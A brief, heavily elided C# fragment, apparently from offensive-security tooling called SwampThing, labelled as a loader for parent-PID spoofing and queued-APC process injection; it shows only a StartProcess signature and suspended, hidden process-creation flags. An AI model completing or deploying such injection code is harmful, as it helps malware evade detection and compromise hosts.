...
namespace SwampThing
{
    class Program
    {
		...
		//TikiTorch Loader to PPID Spoof / QAPC Injection
		
		

        public static ProcessInformation StartProcess(string targetProcess, int parentProcessId)
        {
            ...
            try
            {
                ...
                CreationFlags flags = CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.DETACHED_PROCESS | CreateProcessFlags.CREATE_NO_WINDOW | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT;
